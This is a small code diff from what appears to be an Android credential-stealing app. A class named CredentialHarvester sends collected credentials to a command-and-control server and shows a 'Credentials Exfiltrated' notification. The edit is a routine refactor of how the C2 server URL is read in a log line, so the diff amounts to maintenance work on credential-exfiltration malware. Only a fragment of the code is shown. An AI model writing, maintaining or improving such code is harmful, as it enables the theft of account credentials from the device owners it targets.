@@ -110,7 +110,7 @@ class CredentialHarvester {
                     }
                     c2Client.sendExfiltrationData("credential_collection", credsCollection.toString())
                     
-                    Log.d(TAG, "Credentials sent to C2 server: ${C2Config.SERVER_URL}")
+                    Log.d(TAG, "Credentials sent to C2 server: ${C2Config.getServerUrl()}")
                     
                     // Show success notification
                     showNotification(context, "Credentials Exfiltrated", "Successfully sent to C2 server")
